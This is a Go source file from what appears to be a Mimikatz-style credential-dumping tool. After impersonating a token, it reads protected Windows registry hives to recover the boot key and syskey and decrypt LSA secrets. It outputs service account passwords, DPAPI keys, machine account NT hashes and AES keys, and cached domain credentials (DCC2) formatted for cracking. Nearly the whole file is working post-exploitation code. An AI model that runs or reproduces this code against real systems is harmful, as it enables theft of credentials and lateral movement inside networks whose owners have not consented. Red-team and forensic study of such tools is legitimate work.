package sam

import (
	"bytes"
	"fmt"
	"katz/katz/utils"

	"encoding/binary"
	"encoding/hex"

	"crypto/md5"
	"crypto/rc4"

	"golang.org/x/crypto/md4"
	"golang.org/x/sys/windows"

	"log"
	"strconv"
	"strings"

	"github.com/jfjallid/go-smb/smb/encoder"

	"golang.org/x/sys/windows/registry"
)

// lots of code used from: https://github.com/jfjallid/go-secdump.git
var (
	s1         = []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
	s2         = []byte("0123456789012345678901234567890123456789\x00")
	s3         = []byte("NTPASSWORD\x00")
	BootKey    []byte
	LSAKey     []byte
	NLKMKey    []byte
	VistaStyle bool
)
type domain_account_f struct { // 104 bytes of fixed length fields
	Revision                     uint16
	_                            uint32 // Unknown
	_                            uint16 // Unknown
	CreationTime                 uint64
	DomainModifiedAccount        uint64
	MaxPasswordAge               uint64
	MinPasswordAge               uint64
	ForceLogoff                  uint64
	LockoutDuration              uint64
	LockoutObservationWindow     uint64
	ModifiedCountAtLastPromotion uint64
	NextRid                      uint32
	PasswordProperties           uint32
	MinPasswordLength            uint16
	PasswordHistoryLength        uint16
	LockoutThreshold             uint16
	_                            uint16 // Unknown
	ServerState                  uint32
	ServerRole                   uint32
	UasCompatibilityRequired     uint32
	_                            uint32 // Unknown
	Data                         []byte
}
func (self *domain_account_f) unmarshal(data []byte) (err error) {
	if len(data) < 104 {
		err = fmt.Errorf("Not enough data to unmarshal a DOMAIN_ACCOUNT_F")
		log.Fatalln(err)
		return
	}

	self.Revision = binary.LittleEndian.Uint16(data[:2])
	self.CreationTime = binary.LittleEndian.Uint64(data[8:16])
	self.DomainModifiedAccount = binary.LittleEndian.Uint64(data[16:24])
	self.MaxPasswordAge = binary.LittleEndian.Uint64(data[24:32])
	self.MinPasswordAge = binary.LittleEndian.Uint64(data[32:40])
	self.ForceLogoff = binary.LittleEndian.Uint64(data[40:48])
	self.LockoutDuration = binary.LittleEndian.Uint64(data[48:56])
	self.LockoutObservationWindow = binary.LittleEndian.Uint64(data[56:64])
	self.ModifiedCountAtLastPromotion = binary.LittleEndian.Uint64(data[64:72])
	self.NextRid = binary.LittleEndian.Uint32(data[72:76])
	self.PasswordProperties = binary.LittleEndian.Uint32(data[76:80])
	self.MinPasswordLength = binary.LittleEndian.Uint16(data[80:82])
	self.PasswordHistoryLength = binary.LittleEndian.Uint16(data[82:84])
	self.LockoutThreshold = binary.LittleEndian.Uint16(data[84:86])
	self.ServerState = binary.LittleEndian.Uint32(data[88:92])
	self.ServerRole = binary.LittleEndian.Uint32(data[92:96])
	self.UasCompatibilityRequired = binary.LittleEndian.Uint32(data[96:100])
	if len(data) > 104 {
		self.Data = make([]byte, len(data[104:]))
		copy(self.Data, data[104:])
	}
	return
}

type dpapi_system struct {
	Version    uint32
	MachineKey [20]byte
	UserKey    [20]byte
}

func (self *dpapi_system) unmarshal(data []byte) {
	self.Version = binary.LittleEndian.Uint32(data[:4])
	copy(self.MachineKey[:], data[4:24])
	copy(self.UserKey[:], data[24:44])
}
type PrintableLSASecret struct {
	secretType  string
	secrets     []string
	extraSecret string
}

func (self *PrintableLSASecret) PrintSecret() string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintln(self.secretType))
	for _, item := range self.secrets {
		sb.WriteString(fmt.Sprintln(item))
	}
	if self.extraSecret != "" {
		sb.WriteString(fmt.Sprintln(self.extraSecret))
	}
	return sb.String()
}

type sam_key_data_aes struct {
	Revision    uint32
	Length      uint32
	ChecksumLen uint32
	DataLen     uint32
	Salt        [16]byte
	Data        [32]byte
}
type sam_key_data struct {
	Revision uint32
	Length   uint32
	Salt     [16]byte
	Key      [16]byte
	Checksum [16]byte
	_        uint64
}
type Sam_account struct {
	Name   string
	Rid    uint32
	Nthash string
}

type UserCreds struct {
	Username string
	Data     []byte
	IV       []byte
	RID      uint32
	AES      bool
}
// https://www.passcape.com/index.php?section=docsys&cmd=details&id=23
type lsa_secret struct {
	Version       uint32
	EncKeyId      string // 16 bytes
	EncAlgorithm  uint32
	Flags         uint32
	EncryptedData []byte
}
func (self *lsa_secret) unmarshal(data []byte) error {
    // Need at least 28 bytes for the fixed-size fields
    if len(data) < 28 {
        return fmt.Errorf("insufficient data length for lsa_secret: got %d bytes, need at least 28", len(data))
    }

    self.Version = binary.LittleEndian.Uint32(data[:4])
    self.EncKeyId = string(data[4:20])
    self.EncAlgorithm = binary.LittleEndian.Uint32(data[20:24])
    self.Flags = binary.LittleEndian.Uint32(data[24:28])
    
    // Set encrypted data if there's any data remaining
    if len(data) > 28 {
        self.EncryptedData = data[28:]
    } else {
        self.EncryptedData = []byte{}
    }
    return nil
}
type nl_record struct {
	UserLength               uint16
	DomainNameLength         uint16
	EffectiveNameLength      uint16
	FullNameLength           uint16
	LogonScriptName          uint16
	ProfilePathLength        uint16
	HomeDirectoryLength      uint16
	HomeDirectoryDriveLength uint16
	UserId                   uint32
	PrimaryGroupId           uint32
	GroupCount               uint32
	logonDomainNameLength    uint16
	Unk0                     uint16
	LastWrite                uint64
	Revision                 uint32
	SidCount                 uint32
	Flags                    uint32
	Unk1                     uint32
	LogonPackageLength       uint32
	DnsDomainNameLength      uint16
	UPN                      uint16
	IV                       [16]byte
	CH                       [16]byte
	EncryptedData            []byte
}

func (self *nl_record) unmarshal(data []byte) (err error) {
	if len(data) < 96 {
		err = fmt.Errorf("Not enough data to unmarshal an NL_RECORD")
		fmt.Println(err)
		return
	}

	self.UserLength = binary.LittleEndian.Uint16(data[:2])
	self.DomainNameLength = binary.LittleEndian.Uint16(data[2:4])
	self.EffectiveNameLength = binary.LittleEndian.Uint16(data[4:6])
	self.FullNameLength = binary.LittleEndian.Uint16(data[6:8])
	self.LogonScriptName = binary.LittleEndian.Uint16(data[8:10])
	self.ProfilePathLength = binary.LittleEndian.Uint16(data[10:12])
	self.HomeDirectoryLength = binary.LittleEndian.Uint16(data[12:14])
	self.HomeDirectoryDriveLength = binary.LittleEndian.Uint16(data[14:16])
	self.UserId = binary.LittleEndian.Uint32(data[16:20])
	self.PrimaryGroupId = binary.LittleEndian.Uint32(data[20:24])
	self.GroupCount = binary.LittleEndian.Uint32(data[24:28])
	self.logonDomainNameLength = binary.LittleEndian.Uint16(data[28:30])
	self.Unk0 = binary.LittleEndian.Uint16(data[30:32])
	self.LastWrite = binary.LittleEndian.Uint64(data[32:40])
	self.Revision = binary.LittleEndian.Uint32(data[40:44])
	self.SidCount = binary.LittleEndian.Uint32(data[44:48])
	self.Flags = binary.LittleEndian.Uint32(data[48:52])
	self.Unk1 = binary.LittleEndian.Uint32(data[52:56])
	self.LogonPackageLength = binary.LittleEndian.Uint32(data[56:60])
	self.DnsDomainNameLength = binary.LittleEndian.Uint16(data[60:62])
	self.UPN = binary.LittleEndian.Uint16(data[62:64])
	copy(self.IV[:], data[64:80])
	copy(self.CH[:], data[80:96])
	self.EncryptedData = data[96:]
	return
}
func pad64(data uint64) uint64 {
	if (data & 0x3) > 0 {
		return data + (data & 0x3)
	}
	return data
}
func parseSecret(token windows.Token, name string, secretItem []byte) (result *PrintableLSASecret, err error){
	if len(secretItem) == 0 {
		return
	}
	if bytes.Compare(secretItem[:2], []byte{0,0}) == 0 {
		return
	}
	secret := ""
	extrasecret := ""
	upperName := strings.ToUpper(name)
	result = &PrintableLSASecret{}
	result.secretType = "[*] " + name
	if strings.HasPrefix(upperName, "_SC_") {
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			fmt.Printf("error decoding from unicode string: %s\n", err2)
			err = err2
			return
		}
		svcUser, err := getServiceUser(token, name[4:]) // Skip initial _SC_ of the name
		if err != nil {
			svcUser = "(unknown user)"
		} else{
			if strings.HasPrefix(svcUser, ".\\") {
				svcUser = svcUser[2:]
			}
		}
		secret = fmt.Sprintf("%s: %s", svcUser, secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			fmt.Printf("error decoding from unicode string: %s\n", err2)
			err = err2
			return
		}
		secret = fmt.Sprintf("ASPNET: %s", secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "DPAPI_SYSTEM") {
		dpapi := &dpapi_system{}
		dpapi.unmarshal(secretItem)
		secret = fmt.Sprintf("dpapi_machinekey: 0x%x", dpapi.MachineKey)
		secret2 := fmt.Sprintf("dpapi_userkey: 0x%x", dpapi.UserKey)
		result.secrets = append(result.secrets, secret)
		result.secrets = append(result.secrets, secret2)
		} else if strings.HasPrefix(upperName, "$MACHINE.ACC") {
			//log.Noticeln("Machine Account secret")
			h := md4.New()
			h.Write(secretItem)
			printname := "$MACHINE.ACC"
			secret = fmt.Sprintf("$MACHINE.ACC (NT Hash): %x", h.Sum(nil))
			result.secrets = append(result.secrets, secret)
			// Calculate AES128 and AES256 keys from plaintext passwords
			hostname, domain, err := getHostnameAndDomain(token)
			if err != nil {
				fmt.Println(err)
				// Skip calculation of AES Keys if request failed or if domain is empty
			} else if domain != "" {
				aes128Key, aes256Key, err := CalcMachineAESKeys(hostname, domain, secretItem)
				if err != nil {
					fmt.Println(err)
				} else {
					result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_128_key:%x", printname, aes128Key))
					result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_256_key:%x", printname, aes256Key))
				}
			}
			// Always print plaintext anyway since this may be needed for some popular usecases
			extrasecret = fmt.Sprintf("%s:plain_password_hex:%x", printname, secretItem)
			result.extraSecret = extrasecret
		} else if strings.HasPrefix(upperName, "NL$KM") {
			secret = fmt.Sprintf("NL$KM: 0x%x", secretItem[:16])
			result.secrets = append(result.secrets, secret)
			} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
				//TODO What is CachedDefaultPassword? How is it different from the registry keys under winlogon?
				// Default password for winlogon
				secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
				if err2 != nil {
					err = err2
					fmt.Printf("Error decoding secret '%s' Error: %s",secretItem,err)
					return
				}
				fmt.Println("Check for default username is not implemented yet")
				//username, err := getDefaultLogonName()
				//if err != nil {
				//    log.Errorln(err)
				//}
				username := ""
				if username == "" {
					username = "(Unknown user)"
				}
		
				// Get default login name
				secret = fmt.Sprintf("%s: %s", username, secretDecoded)
				result.secrets = append(result.secrets, secret)
			} else {
				// Handle Security questions?
				fmt.Println("Empty or unhandled secret for %s: %x\n", name, secretItem)
			}
	return

}
func getHostnameAndDomain(token windows.Token) (hostname, domain string, err error) {
	p :=`SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`
	err = utils.InjectToken(token) // inject token
    if err != nil {
        return "", "", fmt.Errorf("failed to inject token: %w", err)
    }
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, p, registry.READ)
	domain, _, err = key.GetStringValue("Domain")
	if err != nil {
		fmt.Println("Cannot get Domain name in 'getHostnameAndDomain' function")
		return
	}
	hostname, _, err = key.GetStringValue("Hostname")
	if err != nil {
		fmt.Println("Cannot get Hostname name in 'getHostnameAndDomain' function")
		return
	}
	return

}


func getServiceUser(token windows.Token, name string) (result string, err error){
	err = utils.InjectToken(token) // inject token
    if err != nil {
        return "", fmt.Errorf("failed to inject token: %w", err)
    }
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\`+name, registry.READ)
	result, _, err = key.GetStringValue("ObjectName")
	return result, err
}



type lsa_secret_blob struct {
    Length  uint32
    Unknown [12]byte
    Secret  []byte
}

func (self *lsa_secret_blob) unmarshal(data []byte) error {
    // Need at least 16 bytes for the header (4 bytes Length + 12 bytes Unknown)
    if len(data) < 16 {
        return fmt.Errorf("insufficient data length for lsa_secret_blob: got %d bytes, need at least 16", len(data))
    }

    self.Length = binary.LittleEndian.Uint32(data[:4])
    copy(self.Unknown[:], data[4:16])

    // Check if we have enough data for the secret
    if len(data) < 16+int(self.Length) {
        return fmt.Errorf("insufficient data length for secret: got %d bytes, need %d", len(data)-16, self.Length)
    }

    self.Secret = data[16 : 16+self.Length]
    return nil
}


// parseRIDFromKey extracts the RID from a registry key name
func ParseRIDFromKey(keyName string) (uint32, error) {
	// Registry key names for user accounts are stored as hex strings
	// Remove any leading/trailing whitespace
	keyName = strings.TrimSpace(keyName)
	
	// Validate key format
	if len(keyName) != 8 {
		return 0, fmt.Errorf("invalid key length: %s", keyName)
	}

	// Parse the hex string to uint32
	ridInt, err := strconv.ParseUint(keyName, 16, 32)
	if err != nil {
		return 0, fmt.Errorf("failed to parse RID from key %s: %w", keyName, err)
	}

	return uint32(ridInt), nil
}

func GetCachedHash(token windows.Token, bootkey []byte, VistaStyle bool) (result []string, err error) {
    err = utils.InjectToken(token) // inject token
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }
	baseKey := `Security\Cache`
	var names []string
	regKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, baseKey, registry.READ)
	defer regKey.Close()
	valueNames, err := regKey.ReadValueNames(-1)
	if len(valueNames) == 0 {
		return
	}
	foundIterCount := false
	for _, name := range valueNames {
		if name == "NL$Control" {
			return
		}
		if name == "NL$IterationCount" {
			foundIterCount = true
			continue
		}
		names = append(names, name)
	}
	iterCount := 10240
	if foundIterCount {
		var tmpIterCount uint32
		data, _, err := regKey.GetBinaryValue("NL$IterationCount")
		if err != nil {
			fmt.Printf("in get cached hashes (line 218): %s\n",err)
			return nil, err
		}
		
		tmpIterCount = binary.LittleEndian.Uint32(data)
		if tmpIterCount > 10240 {
			iterCount = int(tmpIterCount & 0xfffffc00)
		}else {
			iterCount = int(tmpIterCount * 1024)
		}
	}
	_, err = GetLSASecretkey(token, bootkey)
	if err != nil {
		fmt.Printf("error trying to get LSAsecret key in getCachedHashes: %s\n", err)
		return nil, err
	}
	nlkmsecret_key, err := getNLKMSecretKey(token, bootkey, VistaStyle)
	if err != nil {
		fmt.Printf("error trying to get NLKMSecret key in getCachedHashes: %s\n", err)
		return nil, err
	}
	for _, name := range names {
		data, _,_ := regKey.GetBinaryValue(name)
		nl_record := &nl_record{}
		err = nl_record.unmarshal(data)
		if err != nil {
			fmt.Printf("error trying to unmarshal: %s on line 304, continuing...", data)
			continue
		}
		nilIV := make([]byte, 16)
		var plaintext []byte
		var answer string
		if bytes.Compare(nl_record.IV[:], nilIV) != 0 {
			if (nl_record.Flags & 1) == 1 {
				if VistaStyle {
					plaintext, err = DecryptAES(nlkmsecret_key[16:32], nl_record.EncryptedData, nl_record.IV[:])
					if err != nil {
						fmt.Printf("error decrypting plaintext on line 315, error:%s continuing..\n",err)
						continue
					}
				}else {
					fmt.Println("Not yet implement how to decrypt DCC2Cache when not VistaStyle")
					continue
				}
			}else {
				fmt.Println("Not sure how to handle non-encrypted record: %s\n", name)
				continue
			}
			encHash := plaintext[:0x10]
			plaintext = plaintext[0x48:]
			userName, err := encoder.FromUnicodeString(plaintext[:nl_record.UserLength])
			if err != nil {
				fmt.Printf("error decoding from unicode on line 331: %s",err)
			}
			plaintext = plaintext[int(pad64(uint64(nl_record.UserLength)))+int(pad64(uint64(nl_record.DomainNameLength))):]
			domainLong, err := encoder.FromUnicodeString(plaintext[:int(pad64(uint64(nl_record.DnsDomainNameLength)))])
			if err != nil {
				fmt.Printf("error decoding variable plaintext '%s' error: %s\n", plaintext, err)
				continue
			}
			if VistaStyle {
				answer = fmt.Sprintf("%s/%s:$DCC2$%d#%s#%x", domainLong, userName, iterCount, userName, encHash)
				} else {
				
				answer = fmt.Sprintf("%s/%s:%x:%s", domainLong, userName, encHash, userName)
			}
			result = append(result, answer)
		}else {
			continue
		}

	}

    return
}

func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err error) {
	// Inject the token
	err = utils.InjectToken(token)
	if err != nil {
		return nil, fmt.Errorf("failed to inject token: %w", err)
	}

	VistaStyle := true
	var data []byte

	// Open the registry key to check for Vista-style encryption keys
	regKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolEKList`, registry.READ|registry.QUERY_VALUE)
	if err != nil {
		if err == registry.ErrNotExist {
			VistaStyle = false
		} else {
			return nil, fmt.Errorf("error opening key `SECURITY\\Policy\\PolEKList`: %w", err)
		}
	} else {
		defer regKey.Close()

		// Get the size and type of the value
		dataLen, valType, err := regKey.GetValue("", nil)
		if err != nil {
			return nil, fmt.Errorf("error getting value info: %w", err)
		}

		// Allocate buffer of the correct size
		data = make([]byte, dataLen)
		
		// Read the value
		dataLen, valType, err = regKey.GetValue("", data)
		if err != nil {
			return nil, fmt.Errorf("error reading registry value: %w", err)
		}

		// Verify the value type
		if valType != registry.BINARY && valType != registry.NONE {
			return nil, fmt.Errorf("unexpected registry value type: %d", valType)
		}
	}

	// If Vista-style encryption keys are not found, check for pre-Vista encryption keys
	if !VistaStyle {
		regKey, err = registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolSecretEncryptionKey`, registry.READ|registry.QUERY_VALUE)
		if err != nil {
			if err == registry.ErrNotExist {
				return nil, fmt.Errorf("could not find LSA Secret key")
			}
			return nil, fmt.Errorf("error opening key `SECURITY\\Policy\\PolSecretEncryptionKey`: %w", err)
		}
		defer regKey.Close()

		// Get the size and type of the value
		dataLen, valType, err := regKey.GetValue("", nil)
		if err != nil {
			return nil, fmt.Errorf("error getting value info: %w", err)
		}

		// Allocate buffer of the correct size
		data = make([]byte, dataLen)
		
		// Read the value
		dataLen, valType, err = regKey.GetValue("", data)
		if err != nil {
			return nil, fmt.Errorf("error reading registry value: %w", err)
		}

		// Verify the value type
		if valType != registry.BINARY && valType != registry.NONE {
			return nil, fmt.Errorf("unexpected registry value type: %d", valType)
		}
	}

	// Check if data is empty
	if len(data) == 0 {
		return nil, fmt.Errorf("failed to get LSA key: empty data")
	}

	// Decrypt the LSA key
	result, err = decryptLSAKey(bootkey, data, VistaStyle)
	if err != nil {
		return nil, fmt.Errorf("error decrypting LSA key: %w", err)
	}

	// Copy the result to the global LSAKey variable
	LSAKey = make([]byte, 32)
	copy(LSAKey, result)
	return LSAKey, nil
}


func decryptLSAKey(bootkey, data []byte, VistaStyle bool) (result []byte, err error) {
	if len(bootkey) == 0 {
		return nil, fmt.Errorf("bootkey is empty")
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("data is empty")
	}

	var plaintext []byte
	if VistaStyle {
		lsaSecret := &lsa_secret{}
		if err := lsaSecret.unmarshal(data); err != nil {
			return nil, fmt.Errorf("failed to unmarshal LSA secret: %w", err)
		}

		encryptedData := lsaSecret.EncryptedData
		if len(encryptedData) < 32 {
			return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
		}

		tmpkey := SHA256(bootkey, encryptedData[:32], 0)
		plaintext, err = DecryptAES(tmpkey, encryptedData[32:], nil)
		if err != nil {
			return nil, fmt.Errorf("error decrypting LSAKey: %w", err)
		}

		lsaSecretBlob := &lsa_secret_blob{}
		if err := lsaSecretBlob.unmarshal(plaintext); err != nil {
			return nil, fmt.Errorf("failed to unmarshal LSA secret blob: %w", err)
		}

		// Fix the slice bounds issue
		if len(lsaSecretBlob.Secret) < 84 { // 52 + 32
			return nil, fmt.Errorf("secret blob too short: %d bytes", len(lsaSecretBlob.Secret))
		}
		
		result = make([]byte, 32)
		copy(result, lsaSecretBlob.Secret[52:84]) // Use explicit end bound instead of slice
	} else {
		if len(data) < 76 { // Check minimum length for pre-Vista (12 + 48 + 16)
			return nil, fmt.Errorf("pre-Vista data too short: %d bytes", len(data))
		}

		h := md5.New()
		h.Write(bootkey)
		for i := 0; i < 1000; i++ {
			h.Write(data[60:76])
		}
		tmpkey := h.Sum(nil)
		
		c1, err := rc4.NewCipher(tmpkey[:])
		if err != nil {
			return nil, fmt.Errorf("failed to initialize RC4: %w", err)
		}

		plaintext = make([]byte, 48)
		c1.XORKeyStream(plaintext, data[12:60])

		if len(plaintext) < 32 { // 0x20
			return nil, fmt.Errorf("decrypted data too short: %d bytes", len(plaintext))
		}

		result = make([]byte, 16) // 0x20 - 0x10
		copy(result, plaintext[16:32]) // 0x10:0x20
	}

	return result, nil
}
func GetLSASecrets(token windows.Token, bootKey []byte, VistaStyle, history bool) (secrets []PrintableLSASecret, err error) {
    // Inject token
    err = utils.InjectToken(token)
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }

    secretPath := `SECURITY\Policy\Secrets`
    var keys []string
    
    // Open the main secrets key
    regkey, err := registry.OpenKey(registry.LOCAL_MACHINE, secretPath, registry.READ)
    if err != nil {
        return nil, fmt.Errorf("error opening secrets key: %w", err)
    }
    keys, err = regkey.ReadSubKeyNames(-1)
    regkey.Close()
    if err != nil {
        return nil, fmt.Errorf("error reading subkey names: %w", err)
    }

    // Get LSA Secret key
    LSAKey, err = GetLSASecretkey(token, bootKey)
    if err != nil {
        return nil, fmt.Errorf("unable to get LSASecret key: %w", err)
    }

    if len(keys) == 0 {
        return
    }

    for _, key := range keys {
        if key == "NL$Control" {
            continue
        }

        valueTypeList := []string{"CurrVal"}
        if history {
            valueTypeList = append(valueTypeList, "OldVal")
        }

        var secret []byte
        for _, valueType := range valueTypeList {
            k := fmt.Sprintf("%s\\%s\\%s", secretPath, key, valueType)
            
            // Open the specific secret key with proper permissions
            regkey, err = registry.OpenKey(registry.LOCAL_MACHINE, k, registry.READ|registry.QUERY_VALUE)
            if err != nil {
                fmt.Printf("error opening key '%s' error: %s\n", k, err)
                continue
            }

            // Get the size and type of the value first
            dataLen, valType, err := regkey.GetValue("", nil)
            if err != nil {
                fmt.Printf("Error getting value info for '%s' error: %s\n", k, err)
                regkey.Close()
                continue
            }

            if dataLen == 0 {
                regkey.Close()
                continue
            }

            // Allocate buffer and read the value
            value := make([]byte, dataLen)
            dataLen, valType, err = regkey.GetValue("", value)
            if err != nil {
                fmt.Printf("Error reading value for '%s' error: %s\n", k, err)
                regkey.Close()
                continue
            }
            regkey.Close()

            // Verify value type
            if valType != registry.BINARY && valType != registry.NONE {
                fmt.Printf("Unexpected value type %d for key '%s'\n", valType, k)
                continue
            }

            if len(value) != 0 && value[0] == 0x0 {
                if VistaStyle {
                    record := &lsa_secret{}
                    if err := record.unmarshal(value); err != nil {
                        fmt.Printf("Error unmarshaling LSA secret for '%s': %s\n", k, err)
                        continue
                    }

                    if len(record.EncryptedData) < 32 {
                        fmt.Printf("Encrypted data too short for '%s'\n", k)
                        continue
                    }

                    tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
                    plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
                    if err != nil {
                        fmt.Printf("error decrypting tmpkey for '%s': %s\n", k, err)
                        continue
                    }

                    record2 := &lsa_secret_blob{}
                    if err := record2.unmarshal(plaintext); err != nil {
                        fmt.Printf("Error unmarshaling LSA secret blob for '%s': %s\n", k, err)
                        continue
                    }
                    secret = record2.Secret
                } else {
                    continue
                }

                if valueType == "OldVal" {
                    key += "_history"
                }

                ps, err := parseSecret(token, key, secret)
                if err != nil {
                    fmt.Printf("Error parsing secret for '%s': %s\n", key, err)
                } else if ps == nil {
                    continue
                }
                secrets = append(secrets, *ps)
            }
        }
    }
    return
}


func getNLKMSecretKey(token windows.Token, bootkey []byte, VistaStyle bool) (result []byte, err error) {
    // Inject token
    err = utils.InjectToken(token)
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }

    // Open the registry key with proper permissions
    regkey, err := registry.OpenKey(registry.LOCAL_MACHINE, 
        `SECURITY\Policy\Secrets\NL$KM\CurrVal`, 
        registry.READ|registry.QUERY_VALUE)
    if err != nil {
        return nil, fmt.Errorf("error opening key for NLKMSecretKey: %w", err)
    }
    defer regkey.Close()

    // Get the size and type of the value first
    dataLen, valType, err := regkey.GetValue("", nil)
    if err != nil {
        return nil, fmt.Errorf("error getting value info for NLKMSecretKey: %w", err)
    }

    if dataLen == 0 {
        return nil, fmt.Errorf("empty registry value for NLKMSecretKey")
    }

    // Allocate buffer of the correct size
    data := make([]byte, dataLen)
    
    // Read the actual value
    dataLen, valType, err = regkey.GetValue("", data)
    if err != nil {
        return nil, fmt.Errorf("error reading value for NLKMSecretKey: %w", err)
    }

    // Verify the value type
    if valType != registry.BINARY && valType != registry.NONE {
        return nil, fmt.Errorf("unexpected registry value type: %d", valType)
    }

    if VistaStyle {
        if LSAKey == nil || len(LSAKey) == 0 {
            return nil, fmt.Errorf("LSAKey is not initialized")
        }

        lsaSecret := &lsa_secret{}
        if err := lsaSecret.unmarshal(data); err != nil {
            return nil, fmt.Errorf("failed to unmarshal LSA secret: %w", err)
        }

        if len(lsaSecret.EncryptedData) < 32 {
            return nil, fmt.Errorf("encrypted data too short: %d bytes", len(lsaSecret.EncryptedData))
        }

        tmpkey := SHA256(LSAKey, lsaSecret.EncryptedData[:32], 0)
        result, err = DecryptAES(tmpkey, lsaSecret.EncryptedData[32:], nil)
        if err != nil {
            return nil, fmt.Errorf("error decrypting AESKey: %w", err)
        }

        if len(result) < 32 {
            return nil, fmt.Errorf("decrypted result too short: %d bytes", len(result))
        }
    } else {
        return nil, fmt.Errorf("pre-Vista style decryption not yet implemented for NL$KM key")
    }

    // Copy the result to the global NLKMKey variable
    NLKMKey = make([]byte, 32)
    copy(NLKMKey, result[:32])
    
    return result[:32], nil
}


func GetBootKey(token windows.Token) (result []byte, err error) {
	err = utils.InjectToken(token) // inject token
	if err != nil {
		return nil, err
	}

	// Initialize result and scrambled with proper size
	result = make([]byte, 16)
	scrambled := make([]byte, 0, 16)
	
	// Permutation array for unscrambling
	var p []byte = []byte{0x8, 0x5, 0x4, 
		0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}

	// Open the LSA key
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, 
		`SYSTEM\CurrentControlSet\Control\Lsa`, registry.READ|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("error opening LSA key: %v", err)
	}
	defer key.Close()

	// Read the values from the registry
	names := []string{"JD", "Skew1", "GBG", "Data"}
	for _, name := range names {
		subKey, err := registry.OpenKey(key, name, registry.READ|registry.QUERY_VALUE)
		if err != nil {
			return nil, fmt.Errorf("error opening subkey %s: %v", name, err)
		}
		defer subKey.Close()

		// Pre-allocate a large enough buffer for the class
		const maxClassSize = 1024 // Larger buffer size
		classBytes := make([]uint16, maxClassSize)
		classLen := uint32(maxClassSize)
		
		// Get the class string with all other parameters
		var subKeyCount, maxSubKeyLen, maxClassLen uint32
		var valueCount, maxValueNameLen, maxValueLen uint32
		var secDescLen uint32
		var lastWriteTime windows.Filetime

		err = windows.RegQueryInfoKey(
			windows.Handle(subKey),
			&classBytes[0],
			&classLen,
			nil,
			&subKeyCount,
			&maxSubKeyLen,
			&maxClassLen,
			&valueCount,
			&maxValueNameLen,
			&maxValueLen,
			&secDescLen,
			&lastWriteTime,
		)
		if err != nil {
			return nil, fmt.Errorf("error getting class for %s: %v", name, err)
		}

		// Convert class to string and decode hex
		class := windows.UTF16ToString(classBytes[:classLen])
		// log.Printf("Raw class string for %s: %s", name, class) // Debug logging

		decoded, err := hex.DecodeString(class)
		if err != nil {
			return nil, fmt.Errorf("error decoding hex from subkey %s: %v", name, err)
		}

		// Debug logging
		// log.Printf("Key %s class decoded (%d bytes): %x", name, len(decoded), decoded)

		scrambled = append(scrambled, decoded...)
	}

	// Verify we have exactly 16 bytes
	if len(scrambled) != 16 {
		return nil, fmt.Errorf("invalid scrambled key length: got %d bytes, want 16", len(scrambled))
	}

	// log.Printf("Scrambled key (%d bytes): %x", len(scrambled), scrambled)

	// Unscramble using the permutation array
	for i := 0; i < 16; i++ {
		if int(p[i]) >= len(scrambled) {
			return nil, fmt.Errorf("permutation index out of range: %d >= %d", p[i], len(scrambled))
		}
		result[i] = scrambled[p[i]]
	}

	bootKey := make([]byte, 16)
	copy(bootKey, result)

	// log.Printf("Boot key: %x", bootKey)

	return bootKey, nil
}
func GetSysKey(token windows.Token, bootKey []byte) ([]byte, error){
	err := utils.InjectToken(token) // inject token
	if err != nil {
		return nil,err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account`, registry.READ)
	defer key.Close()
	Data, _,err := key.GetBinaryValue("F")
	// TODO: Add code to decrypt the system key
	var encSysKey []byte
	var sysKeyIV []byte
	var tmpSys []byte
	sysKey := make([]byte, 16)
	f := &domain_account_f{}
	err = f.unmarshal(Data)
	if f.Revision == 3 {
		// AES
		samAESData := sam_key_data_aes{}
		err = binary.Read(bytes.NewBuffer(f.Data), binary.LittleEndian, &samAESData)
		if err != nil {
			return nil, err
		}
		sysKeyIV = samAESData.Salt[:]
		encSysKey = samAESData.Data[:samAESData.DataLen]
		tmpSys, err  = DecryptAES(bootKey, encSysKey, sysKeyIV)
		copy(sysKey, tmpSys)

	}else{
		err = fmt.Errorf("Unsupported revision %s", f.Revision)
		return nil, err
	}


	return sysKey, err

}
